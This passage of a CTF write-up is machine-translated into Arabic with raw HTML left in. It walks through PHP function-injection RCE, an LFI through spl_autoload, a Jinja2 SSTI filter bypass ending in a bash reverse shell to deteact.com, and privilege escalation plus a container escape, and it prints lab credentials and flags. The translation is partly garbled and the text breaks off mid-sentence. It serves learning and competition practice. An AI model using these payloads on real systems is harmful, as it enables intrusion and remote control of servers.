INCORRECT_MIMETYPE = <span class="hljs-number"><span class="hljs-number">6</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INVALID_PARAMS = <span class="hljs-number"><span class="hljs-number">7</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_SIZE = <span class="hljs-number"><span class="hljs-number">8</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> MOVE_ERROR = <span class="hljs-number"><span class="hljs-number">9</span></span>; }</code> </pre> <br></div></div><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุดูู / check.php</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">verify_parameters</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'submit'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::POST_SUBMIT; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_FILES[<span class="hljs-string"><span class="hljs-string">'imageFile'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::IMAGE_NOT_FOUND; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $imageFileType = strtolower(pathinfo($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>], PATHINFO_EXTENSION)); $imageFileInfo = getimagesize($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($imageFileInfo === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::NOT_IMAGE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>] &gt; <span class="hljs-number"><span class="hljs-number">1024</span></span>*<span class="hljs-number"><span class="hljs-number">32</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::BIG_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!in_array($imageFileType, [<span class="hljs-string"><span class="hljs-string">'jpg'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_EXTENSION; } $imageMimeType = $imageFileInfo[<span class="hljs-string"><span class="hljs-string">'mime'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($imageMimeType !== <span class="hljs-string"><span class="hljs-string">'image/jpeg'</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_MIMETYPE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (file_exists($target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::FILE_EXISTS; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INVALID_PARAMS; } $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (($size &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) || ($size &gt; <span class="hljs-number"><span class="hljs-number">512</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br></div></div><br>  ูุฐุง ูุนุทููุง: <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุงุณู ุงููุณุชุฎุฏู / ูููุฉ ุงููุฑูุฑ ุงูุฎุงุตุฉ ุจู Admin Basic.  ุนุฏููุฉ ุงููุงุฆุฏุฉ ุชูุงูุง ุ ูุฅูู ูุทุจุน ููุท ุงูุณูุณูุฉ: <br>  <i>Congratz.</i>  <i>ุงูุขู ููููู ูุฑุงุกุฉ ุงููุตุงุฏุฑ.</i>  <i>ุงูุฐูุงุจ ุฃุนูู.</i> </li><li style=";text-align:right;direction:rtl">  ุญูู ูุธููุฉ (FI) ุนูู ุงููุฏุฎูุงุช " <i>ุชุตููุฉ</i> ". </li><li style=";text-align:right;direction:rtl">  ุงูุชุญูู ูู ุชุญููู ุงูุตูุฑ ุฃุตุจุญ ูุงุถุญูุง ุงูุขู ุจุงููุณุจุฉ ููุง. </li><li style=";text-align:right;direction:rtl">  ูุชู ุงุณุชุฎุฏุงู ููุชุจุฉ ImageMagic.  ุนูู ุงูุชุฑุงุถ ุฃูู ูุณุชุฎุฏู ููุงุณุชุบูุงู ูู ุทุฑูู ูุณุฏูุฏ.  ูุง ุฃุนุชูุฏ ุฃู ููุงู ุฃู ุทุฑููุฉ ูุงุณุชุบูุงููุง ุฏูู ุงูุงุนุชูุงุฏ ุนูู FI. </li></ul><br><h4 style=";text-align:right;direction:rtl">  ุงูุถุนู: ูุธููุฉ ุงูุญูู </h4><br>  ูุญุชูู ุงูููู <b>upload.php</b> ุนูู ุจุนุถ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุงููุดุจููุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs">$filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text);</code> </pre> <br>  ูููููุง ุชุจุณูุท ุฐูู ุฅูู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs">$filterImage = $_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>](intval($_GET[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]), $_GET[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]);</code> </pre> <br>  ููููู ูู ุงููุงูุน ุงูุชุดุงู ูุฐู ุงูุซุบุฑุฉ ุงูุฃูููุฉ ููุท ุนู ุทุฑูู ุงูููุงู ุจุจุนุถ ุงูุชุดููุด.  ุฅุฑุณุงู ุฃุณูุงุก ุงููุธุงุฆู ูุซู " <b>var_dump</b> " ุฃู " <b>debug_zval_dump</b> " ูู ุฅุฏุฎุงู " <i>filter</i> " ุณูุคุฏู ุฅูู ุฑุฏูุฏ ูุซูุฑุฉ ููุงูุชูุงู ูู ุงูุฎุงุฏู. <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">int(51) string(10) "jsdksjdksds"&lt;/code&gt; So, its not hard to guess how server side code looks like. If we had an write permission to www root, than we could just use two functions: &lt;code&gt;file_put_contents(0, "&lt;?php system($_GET[a]);") chmod(0, 777)</code> </pre> <br>  ููููุง ููุณุช ูุถูุชูุง.  ููุงู ุทุฑููุชุงู ุนูู ุงูุฃูู ูุญู ุงููููุฉ. <br><br><h4 style=";text-align:right;direction:rtl">  filter_input_array vector (ูุญููู ุบูุฑ ููุตูุฏ): RCE vector </h4><br>  ุฃุซูุงุก ุงูุชูููุฑ ูู ุงูุทุฑู ุงูููููุฉ ููุญุตูู ุนูู RCE ุ ูุงุญุธุช ุฃู <code>function filter_input_array</code> ุชููุญู <code>function filter_input_array</code> ุฌูุฏูุง ูู <code>$filterImage variable</code> . <br><br>  ุชูุฑูุฑ <b>ุตููู ุนุงูู ุงูุชุตููุฉ</b> ููุณูุทุฉ ุซุงููุฉ ุ ุณูุณูุญ ุจุฅูุดุงุก ุตููู ุนุดูุงุฆู ุนูู ูุชูุฌุฉ ุงููุธููุฉ. <br><br>  ููู ImageMagic ูุง ุชุชููุน ุงูุญุตูู ุนูู ุฃู ุดูุก ุฅูู ุฌุงูุจ ูุฆุฉ Imagick.  :( <br><br>  ูุฏ ูููู ูู ูุณุนูุง ุฅูุบุงุก ุชุฏููู ุงูุตู ูู ุงููุฏุฎูุงุชุ  ุฏุนูุง ูุจุญุซ ุนู ูุณูุทุงุช <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุนูุงูู</a> ุงูุชุตููุฉ ุงูุฅุถุงููุฉ ูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุตู filter_input_array</a> . <br><br>  ูู ูุชู ุฐูุฑูุง ูู ุตูุญุฉ ุงููุธููุฉ ููุณูุง ุ ูููู ูููููุง ูุนููุง ุชูุฑูุฑ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุฑุฏ ุงุชุตุงู ููุชุญูู ูู ุตุญุฉ ุงูุฅุฏุฎุงู</a> .  ูุซุงู FILTER_CALLBACK ุฎุงุต ุจู <code>filter_input</code> ุ ูููู ูุนูู ูุน <code>filter_input_array</code> ุ ุฃูุถูุง! <br><br>  ูุฐุง ูุนูู ุฃูู ูููููุง "ุงูุชุญูู ูู" ุฅุฏุฎุงูุงุช ุงููุณุชุฎุฏู ุงููุฎุตุต ุจุงุณุชุฎุฏุงู ุงููุธููุฉ ูุน ูุณูุทุฉ ูุงุญุฏุฉ (evalุ ุงููุธุงูุ) ุ ููุฏููุง ุงูุณูุทุฑุฉ ุนูู ุงููุณูุทุฉ. <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">FILTER_CALLBACK = 1024</code> </pre> <br>  ูุซุงู ููุญุตูู ุนูู RCE: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">GET: a=/get_the_flag POST: filter=filter_input_array size=1 text[a][filter]=1024 text[a][options]=system submit=1</code> </pre> <br>  ุงูุฑุฏ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">*** Wooooohooo! *** Congratulations! Your flag is: 1m_t3h_R34L_binaeb_g1mme_my_71ck37 -- SPbCTF (vk.com/spbctf)</code> </pre> <br>  ุฎุท <b>ุงูุจุญุซ</b> : <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br><br>  ูุงู ููุงู ุจุงูุชุฃููุฏ ุดุนูุฑ ุฎุงุทุฆ ุ ูุฃููุง ุญุชู ูุญุชุงุฌ ุฅูู ุงูุญุตูู ุนูู ุงูููุฏ ุงููุตุฏุฑูุ  ููุท ููุชูููุญุ  ููุงุฐุง ุชู ุชุฎุฒูู ุงููููุงุช ุงููุญููุฉ ุนูู ุงููุฑุต ุ ุฃููุณ ุฃูุซุฑ ููุงุกูุฉ ุนุฏู ุชุฎุฒูู ุงููููุงุช ุบูุฑ ุงููุฑุบูุจ ูููุง ูู ุงููุณุชุฎุฏููู ุงูุฐูู ููุซููู ุชุญุฏููุงุ <br><br>  ุตุฏูุฉ ูู ุชุณููุฉ <b>ูุฑุดุญ</b> = <b>filter</b> _input_array ุ ุฃุนุทุงูู ุงููุต [a] [ <b>filter</b> ] ุงูุซูุฉ ุจุฃู ูู ุดูุก ุชู ููุง ูู ูุชููุน (" <b>ุนูุงูู ุชุตููุฉ</b> ูู ูุณุจู ููุง ูุซูู" ุ ุชุญูู ูู โ). <br><br><h4 style=";text-align:right;direction:rtl">  spl_autoload vector: LFI vector </h4><br>  ุจุนุฏ ุชูุฏูู ุงูุญู ุ ุงุชุตู ุจู ุฃุญุฏ ูุคููู ุงูุชุญุฏูุงุช ุ ุงูุฐูู ูุงููุง ุฅู ุงููุชุฌู ุงูุฎุงุต ุจู ูู ููู ููุตูุฏูุง ููููู ุงุณุชุฎุฏุงู ูุธููุฉ ุฃุฎุฑู ( <code>spl_autoload</code> ): <br><br>  ููุณ ูู ุงููุงุถุญ ููู ูููููุง ุงุณุชุฎุฏุงู ูุฐู ุงููุธููุฉ ูุฃูู ูู ุงูููุชุฑุถ ุชุญููู ูุฆุฉ "&lt;class_name&gt;" ูู ุงูููู ุงููุณูู "&lt;class_name&gt; &lt;some_extension&gt;".  ุงูุชูููุน ูู ุงูุชุงูู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs">void spl_autoload ( string $class_name [, string $file_extensions = spl_autoload_extensions() ] )</code> </pre> <br>  ูููู ุฃู ุชููู ุงููุณูุทุฉ ุงูุฃููู ูุฏููุง ูู ููุท (1-512) ุ ูุฐูู <i>ุงุณู ุงููุตู</i> ูู ... ุฑููุ ... ุบุฑูุจ. <br>  ุชุจุฏู ุญุฌุฉ <i>ุงูุฅุถุงูุฉ</i> ุฃูุถูุง ุบูุฑ ุตุงูุญุฉ ููุงุณุชุฎุฏุงู ุ ูุงููููุงุช ุงูุชู ูุชู ุงูุชุญูู ูููุง ูู ูุณุชูู ูุงุญุฏ ุฃุนูู ูู <b>upload.php</b> (ูุญุชุงุฌ ุฅูู ุชูุฑูุฑ ุจุงุฏุฆุฉ). <br><br>  ูุฐู ุงููุธููุฉ ูููู ุฃู ุชุนุทููุง ุจุงููุนู LFI ุฅุฐุง ุงุณุชุฎุฏูุช ุจูุฐู ุงูุทุฑููุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">spl_autoload(51, "a8ae2cab09c6b728919fe09af57ded/1.jpg") = include("51a8ae2cab09c6b728919fe09af57ded/1.jpg")</code> </pre> <br>  ูุชู ุงูุญุตูู ุนูู ุงุณู ุงูุฏููู ูู ุดูุฑุฉ ุงููุตุฏุฑ ุงููุณุฑุจุฉ.  ููุฏ ุญุงูููุง ุงูุญุธ ุ ูุฃูู ุฅุฐุง ูุงู ุงูุญุฑู ุงูุฃูู ูู ุงูุงุณู ูู ุฃู ุดูุก ุฅูู ุฌุงูุจ ุงูุฑูู -&gt; ููุง ูููููุง ุชุถููู ูููุงุช ูู ููุงู. <br><br>  ูุฐูู ... ูู ูุง ูุญุชุงุฌ ุฅููู ุงูุขู ูู ุชูุฑูุฑ "ููุน ุตุงูุญ" (ูุฌุจ ุฃู ููุจูู <b>getimagesize</b> ) <b>*</b> ููู jpg. ุจุฑูุฒ php ุงูุฐู ุชู ุฅุฑุณุงูู.  ูุซุงู ุจุณูุท (ุญูููุฉ php ูู exif) ูุฑูู. <br><br>  ูู <i>ุจุชุญูููู</i> ูู <i>1111.jpg</i> ุ ููู ุจูุง ููู: <br><br>  ุงูุญุตูู ุนูู: <br>  a = / get_the_flag <br><br>  ุจุนุฏ: <br>  ูุฑุดุญ = spl_autoload <br>  ุงูุญุฌู = 51 <br>  text = a8ae2cab09c6b728919fe09af57ded / 1111.jpg <br>  ุฅุฑุณุงู = 1 <br><br>  ุงูุฑุฏ: <br> <code>... .JFIF ... Exif MM * . " (. . .i . . D . D .. V .. <br> *** Wooooohooo! *** <br> <br> Congratulations! Your flag is: <br> 1m_t3h_R34L_binaeb_g1mme_my_71ck37 <br> <br> -- SPbCTF (vk.com/spbctf)</code> <br>  ุฎุท <b>ุงูุจุญุซ</b> : <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br>  ูููู ุฅุฌุฑุงุก ุงูุชุญููู ู LFI ูู ุทูุจ ูุงุญุฏ. <br><br><img src="https://habrastorage.org/webt/ya/ss/ns/yassnsu_przliwzh-nj1s0sm1gs.jpeg"><br><br><h2 style=";text-align:right;direction:rtl"><a name="Time"></a>  ููู 5.  ุงูููุช </h2><br>  ุชู ุฅุนุฏุงุฏ ูุฐู ุงููููุฉ ูู ูุจู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุฑูู ุงูุฃูู ุงูุฑููู</a> <br>  <i>ุฃูู ูุง ุชุญุชุงุฌู ูู ุฅุฎุถุงุน ุงูููุช ุ ูุงูุซุงูู ูู ุชุฌุงูุฒ ุงูุนุงูู ุงูุตุบูุฑ.</i>  <i>ุจุนุฏ ุฐูู ุณูู ุชุญุตู ุนูู ุณูุงุญ ุถุฏ ุงููุณุชูู ุงูููุงุฆู ูููุฏุฑุจ.</i>  <i>ุญุธุง ุณุนูุฏุง</i> <i><br><br></i>  <i>51.15.75.80</i> <i><br></i> <br>  <b>ุชูููุญุงุช</b> <br>  <i><b>10/27/2018 16:00</b></i> <i><br></i>  <i>ุฃูู ุ ูู ุนุฏุฏ ุงูุฃุฌูุฒุฉ ุนูู ุนูุจุฉ ... ูู ูู ูููุฏุฉ ุญููุงุ</i> <i><br></i>  <i><b>10/27/2018 14:35</b></i> <i><br></i>  <i>ุฅุฐุง ููุช ูุงุฏุฑูุง ุนูู ุงูุชุนุงูู ูุน ุงููุฑุดุญ ุนูู ููุญุฉ ุงูููุช ุ ูููููู ุงุณุชุฎุฏุงู ุฅููุงููุงุช ุงููุธุงู ุจุฃูููู.</i>  <i>ูุง ุชุฎุฌู.</i> <i><br></i>  <i><b>10/27/2018 14:25</b></i> <i><br></i>  <i>ุชุญูู ุงููุถูู ุงูุธุงูุฑู ููุง ุฃุณูุจ ูู 200</i> <i><br></i>  <i><b>10/26/2018 19:25</b></i> <i><br></i>  <i>ุงููููุฉ ูู ุชุญู</i>  <i>ุชูุช ุฅุถุงูุฉ 24 ุณุงุนุฉ.</i> <i><br></i>  <i><b>10/26/2018 17:35</b></i> <i><br></i>  <i>ุงุณุชุฎุฏุงู ูู ูุง ุชุจุฐูููู ูู ุงููุฏุฑุงุช.</i> <i><br></i>  <i><b>10/26/2018 12:25</b></i> <i><br></i>  <i>ูุง ุชุญุชุงุฌ ุฅูู ุฃู ุจุฑูุงูุฌ ุดุฑุนู ูุฅููุงู ุฃู ูุฑุญูุฉ ูู ุงููููุฉ.</i> <br><br><h4 style=";text-align:right;direction:rtl">  1) ููุฑุฏ </h4><br>  ูู ุงูุจุฏุงูุฉ ุ ุญุตููุง ุนูู ุงูุนููุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">51.15.75.80</a> . <br>  ูุญู ูุฏูุฑ ุงููุฏุฑุจ - ูุฑู ุงูุฏููู / ููุฑุฏ /.  ุงูุชูู ุนูู ุงูููุฑ ุฅูู ููุญุฉ <i>ุงููุณุคูู</i> ุชุญุช <i>admin: admin</i> . <br>  ูู ููุญุฉ ุงููุดุฑู ุ ูุฑู ุฃูู ูุง ุชูุฌุฏ ุงูุชูุงุฒุงุช ูุชุบููุฑ ุงูููุงูุจ ุ ูุฐูู ูุง ููููู ุงูุญุตูู ุนูู RCE.  ููุน ุฐูู ุ ููุงู ููุดูุฑ ูุฎูู: <br>  <i>09/25/2018 ูู ูุจู ุงููุณุคูู</i> <i><br></i>  <i>ุฎุงุต: ููุงุญุธุงุช ุญูู ููุญุฉ ุงูููุช</i> <i><br></i>  <i>ุชุณุฌูู ุงูุฏุฎูู: ูุฑูุณุชููุฑ</i> <i><br></i>  <i>ูููุฉ ุงููุฑูุฑ: L2tAPJReLbNSn085lTvRNj</i> <i><br></i>  <i>ุงููุถูู: timepanel.zn</i> <br><br><h4 style=";text-align:right;direction:rtl">  2) SSTI </h4><br>  ูู ุงููุงุถุญ ุฃูู ุชุญุชุงุฌ ุฅูู ุงูุงูุชูุงู ุฅูู ููุณ ุงูุฎุงุฏู ุนู ุทุฑูู ุชุญุฏูุฏ <b>timepanel.zn</b> ุงููุถูู ุงูุธุงูุฑู <b>.</b> <br>  ูุจุฏุฃ ุชุดุบูู hehdirb ุนูู ูุฐุง ุงููุถูู - ูุฑู / adm_auth ุงูุฏููู ุ ููุญู ูุฐูุจ ุชุญุช ุชุณุฌูู ุงูุฏุฎูู ููููุฉ ุงููุฑูุฑ ุงููุงุฑุฏุฉ ุฃุนูุงู.  ูุฑู ุงููููุฐุฌ ุงูุฐู ุชุญุชุงุฌ ุฅูู ุฅุฏุฎุงู ุงูุชูุงุฑูุฎ ("ูู" ู "ุฅูู") ููุญุตูู ุนูู ุจุนุถ ุงููุนูููุงุช.  ูู ุงูููุช ููุณู ุ ูุฑู ุชุนููููุง ูู ุงุณุชุฌุงุจุฉ HTML code ุญูุซ ุชูุนูุณ ููุณ ุงูุชูุงุฑูุฎ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:00, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  ูู ุงููุงุถุญ ุฃู ุงูุฎุทุฃ ููุง ุนูู ุงูุฃุฑุฌุญ ูุฌุจ ุฃู ูููู ูุฑุชุจุทูุง ุจูุฐุง ุงูุงูุนูุงุณ ุ ููู ุบูุฑ ุงููุฑุฌุญ ุฃู ูููู XSS ุ ูุฐุง ุฌุฑููุจ SSTI: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">start=2018-10-25+20%3A00%3A00{{ 1 * 0 }}&amp;finish=2018-10-26+20%3A00%3A00</code> </pre> <br>  ุงูุฌูุงุจ ูู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:000, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  ุนู ุทุฑูู ุฅุฑุณุงู {{self}} ุ {{'a' * 5}} ุ ูุฏุฑู ุฃู ูุฐุง ูู <b>Jinja2</b> ุ ููู ุงููุชุฌูุงุช ุงูููุงุณูุฉ ูุง ุชุนูู.  ุฅุฑุณุงู ูุชุฌูุงุช ุจุฏูู {{brackets}} ุ ูุฑู ุฃู ุงูุฅุฌุงุจุฉ ูุง ุชุนูุณ ุงูุฃุญุฑู "_" ูุจุนุถ ุงููููุงุช ุ ุนูู ุณุจูู ุงููุซุงู ุ "class".  ูุชู ุชุฌุงูุฒ ูุฐุง ุงููุฑุดุญ ุจุณูููุฉ ูู ุฎูุงู ุงุณุชุฎุฏุงู request.args ูุงูุจูุงุก | attr () ุ ููุฐูู ุชุฑููุฒ ุจุนุถ ูุญุฏุงุช ุงูุจุงูุช ูุน ุชุณูุณู ูุฑูุจ. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงูุงุณุชุนูุงู ุงูููุงุฆู ุนู backconnect</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"> <code>POST /adm_main?sc=from+subprocess+import+check_output%0aRUNCMD+%3d+check_output&amp;cmd=bash+-c+'bash+-i+&gt;/dev/tcp/deteact.com/8000+&lt;%261' HTTP/1.1 <br> Host: timepanel.zn <br> Content-Type: application/x-www-form-urlencoded <br> Content-Length: 616 <br> Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.DrOOLQ.ROX16sOUD_7v5Ct-dV5lywHj0YM <br> <br> start={{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg','w')|attr('write')(request.args.sc) }} <br> {{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg')|attr('read')() }} <br> {{ config|attr('from\x5fpyfile')('/var/tmp/BECHED.cfg') }} <br> {{ config['RUNCMD'](request.args.cmd,shell=True) }} <br> &amp;finish=2018-10-26+20%3A00%3A00</code> <br> </div></div><br><h4 style=";text-align:right;direction:rtl">  3) LPE </h4><br>  ุจุนุฏ ุชููู RCE ุ ูุฏุฑู ุฃูู ุจุญุงุฌุฉ ุฅูู ุฑูุน ุงูุงูุชูุงุฒุงุช ุฅูู ุงูุฌุฐุฑ.  ููุงู ุงูุนุฏูุฏ ูู ุงููุณุงุฑุงุช ุงูุฎุงุทุฆุฉ (/ usr / bin / special ุ /opt/privesc.py ูุบูุฑูุง) ุงูุชู ูุง ุฃุฑูุฏ ูุตููุง ุ ูุฃููุง ูุง ุชุณุชุบุฑู ุณูู ููุช.  ููุงู ุฃูุถูุง binar / usr / bin / zero ุ ูุงูุฐู ูุง ูุญุชูู ุนูู ุฌุฒุก ูู ูุธุงู suid ุ ููู ุงุชุถุญ ุฃูู ููููู ูุฑุงุกุฉ ุฃู ูููุงุช (ููุท ุฃุฑุณูู ุงููุณุงุฑ ุงููุดูุฑ ุจุงูุณุฏุงุณู ูู stdin). <br><br>  ุงูุณุจุจ ูู ุงููุฏุฑุงุช (/ usr / bin / zero = cap_dac_read_search + ep). <br>  ููุฏ ูุฑุฃูุง ุงูุธู ุ ููููุง ุจุชุนููู ุงูุชุฌุฒุฆุฉ ุงููุฑุงุฏ ุชูุฑูุดูุง ุ ูููู ุจูููุง ูุชู ุชูุธูููุง ุ ูุฅููุง ูุนุชูุฏ ุฃููุง ูุญุชุงุฌ ุฅูู ูุฑุงุกุฉ ููู ูุณุชุฎุฏู ุขุฎุฑ ููุฌูุฏ ุนูู ุงููุธุงู: <br><br> <code>$ echo /home/cristopher/.bash_history | xxd -p | zero</code> <br> <br>  <i>ูููููู ูุฑุงุกุฉ ุดูุก ูู</i> <i><br></i>  <i>ุณู</i> <i><br></i>  <i>Dpyax4TkuEVVsgQNz6GUQX</i> <br><br><h4 style=";text-align:right;direction:rtl">  4) ุนุงูู ุงููููุงุก ุงููุฑูุจ / ุงูุทุจ ุงูุดุฑุนู </h4><br>  ูุฐูู ุ ูุฏููุง ุงูุฌุฐุฑ.  ููู ูุฐู ููุณุช ุงูููุงูุฉ.  <i>ูุถุน apt install extundelete</i> ููุฌุฏ ุงูุนุฏูุฏ ูู ุงููููุงุช ุงูุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู ูู ูุธุงู ุงููููุงุช ุงููุฑุชุจุทุฉ ุจุงููุฑุญูุฉ ุงูุชุงููุฉ: <br><br>  <i>ููุญุตูู ุนูู ุชุฐูุฑุฉ ุ ุชุญุชุงุฌ ุฅูู ุชุบููุฑ ุตูุฑุฉ ุญุชู ูุชู ุชุญุฏูุฏูุง ุนูู ุฃููุง "1".</i>  <i>ูุฏูู ูููุฐุฌ ูุตูุฑุฉ.</i>  <i>curl -X POST -F image=@ZeroSource.bmp 'http://51.15.100.188 {6491 / forecast'.</i> <br><br>  ูุฐูู ุ ููุงุฌู ุงูุขู ุงููููุฉ ุงูููุงุณูุฉ ุงููุชูุซูุฉ ูู ุชูููุฏ ูุซุงู ุชูุงูุณู ููููุฐุฌ ุงูุชุนูู ุงูุขูู.  ููุน ุฐูู ุ ูู ูุฐู ุงููุฑุญูุฉ ูุง ุฒูุช ูุง ุฃุณุชุทูุน ุงูุญุตูู ุนูู ุฌููุน ุงููููุงุช ุงูุชู ุงุญุชุงุฌูุง.  ูุงู ูู ุงููููู ุงูููุงู ุจุฐูู ููุท ุนู ุทุฑูู ูุถุน ูููู R-Studio ุนูู ุงูุฎุงุฏู ููุนุงูุฌุฉ ุงูุทุจ ุงูุดุฑุนู ุนู ุจุนุฏ.  ุจุนุฏ ุฃู ููุช ุจุณุญุจ ูุง ุฃุญุชุงุฌ ุฅููู ุชูุฑูุจูุง ุ ุงูุชุดูุช ุฃูู ูู ุงููุงูุน ุ ุชุนูู ุญุงููุฉ ุงูุฅุฑุณุงุก ูู ูุถุน ูุณูุญ ูู ุจุชุญููู ุงููุฑุต ุจุฃูููู <br><br>  ูุญู ูุฌุนู mount / dev / vda1 / root / kek ููุญุตู ุนูู ุฅููุงููุฉ ุงููุตูู ุฅูู ูุธุงู ุงููููุงุช ุงููุถูู ุ ููู ููุณ ุงูููุช ูููู ุจุงููุตูู ุงูุฌุฐุฑ ุฅูู ุงูุฎุงุฏู ุจุฃูููู (ุญูุซ ูููููุง ูุถุน ููุชุงุญ ssh ุงูุฎุงุต ุจูุง).  ูุญู ูุฎุฑุฌ KerasModel.h5 ุ ZeroSource.bmp. <br><br><h4 style=";text-align:right;direction:rtl">  5) ุฎุตููุฉ ML </h4><br>  ูุชุถุญ ุนูู ุงูููุฑ ูู ุงูุตูุฑุฉ ุฃู ุงูุดุจูุฉ ุงูุนุตุจูุฉ ูุชู ุชุฏุฑูุจูุง ุนูู ูุฌููุนุฉ ุงูุจูุงูุงุช MNIST.  ุนูุฏูุง ูุญุงูู ุฅุฑุณุงู ุตูุฑุฉ ุชุนุณููุฉ ุฅูู ุงูุฎุงุฏู ุ ูุญุตู ุนูู ุงูุฅุฌุงุจุฉ ุจุฃู ุงูุตูุฑ ุชุฎุชูู ูุซูุฑูุง.  ูุฐุง ูุนูู ุฃู 